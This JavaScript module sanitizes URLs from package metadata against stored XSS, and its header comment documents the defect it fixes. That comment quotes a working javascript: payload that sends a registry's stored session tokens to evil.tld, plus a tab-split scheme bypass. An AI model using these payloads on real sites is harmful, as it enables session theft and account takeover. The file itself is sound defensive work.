/**
 * URL scheme allow-listing for values that come from package metadata.
 *
 * ── Defect D76 — stored XSS through `repository` / `homepage` ─────────────────
 * `package.repository` and `package.homepage` are lifted verbatim from a
 * package's `fpm.toml`, supplied by whoever published it. They were rendered
 * straight into an `href`:
 *
 *     <a href={data.repository} target="_blank" rel="noopener noreferrer">
 *
 * React 18 does **not** block `javascript:` URLs. It logs a development-only
 * warning and renders the anchor anyway (`react-dom.development.js`,
 * `sanitizeURL` -> `error(...)` -> returns `url` unchanged). So a manifest
 * declaring
 *
 *     repository = "javascript:fetch('https://evil.tld/?d='+localStorage.getItem('persist:root'))"
 *
 * executed in the registry's origin for any visitor who clicked the link.
 *
 * Why that is account takeover rather than a nuisance: `src/index.js:27-52`
 * persists the access **and** refresh tokens to `localStorage` under
 * `persist:root`. One click exfiltrates a live session, and with it the ability
 * to publish packages, delete namespaces and grant admin — the entire
 * privilege boundary described in D68/D74.
 *
 * `target="_blank"` is not a mitigation: a `javascript:` URL is not a
 * navigable cross-origin target, so the `rel="noopener"` semantics that make
 * `target="_blank"` safe for `http(s)` do not apply.
 *
 * ── Why an allow-list and not a block-list ────────────────────────────────────
 * Blocking `javascript:` alone still leaves `data:`, `vbscript:` and `file:`
 * live, and every future scheme a browser grows. An allow-list fails closed:
 * a scheme nobody thought of is not rendered as a link.
 *
 * Relative and root-relative URLs are allowed, because the app links to its own
 * API with them (see `archives.js`, `download_url`). Protocol-relative
 * (`//host`) is allowed: it inherits the page's scheme and cannot introduce
 * `javascript:`, so it is equivalent to `https:` on an HTTPS deployment.
 */

const ALLOWED_SCHEME = /^(https?:|mailto:|tel:)/i;

/** A same-origin relative path: no scheme, and not protocol-relative. */
const RELATIVE_PATH = /^(?![a-z][a-z0-9+.-]*:)/i;

/**
 * Is this string safe to use as an `href`?
 *
 * @param {unknown} value
 * @returns {boolean}
 */
export function isSafeUrl(value) {
  if (typeof value !== "string") return false;

  const trimmed = value.trim();
  if (trimmed === "") return false;

  // Control characters are stripped by browsers before resolving a scheme, so
  // `java\tscript:alert(1)` reaches the parser as `javascript:alert(1)`. Testing
  // the raw string would pass it.
  // eslint-disable-next-line no-control-regex
  const cleaned = trimmed.replace(/[\u0000-\u001f\u007f]/g, "");
  if (cleaned === "") return false;

  if (ALLOWED_SCHEME.test(cleaned)) return true;

  // Protocol-relative: inherits the page scheme, so it is safe.
  if (cleaned.startsWith("//")) return true;

  // Relative path. The negative lookahead rejects anything that begins with
  // something scheme-shaped, which is the case the allow-list above missed.
  return RELATIVE_PATH.test(cleaned);
}

/**
 * `value` if it is safe to link to, otherwise `null`.
 *
 * Returning `null` rather than a placeholder matters: callers use it as the
 * render condition, so an unsafe or absent value renders the field as omitted
 * instead of as a dead link.
 *
 * @param {unknown} value
 * @returns {string | null}
 */
export function safeUrl(value) {
  return isSafeUrl(value) ? String(value).trim() : null;
}

export default safeUrl;
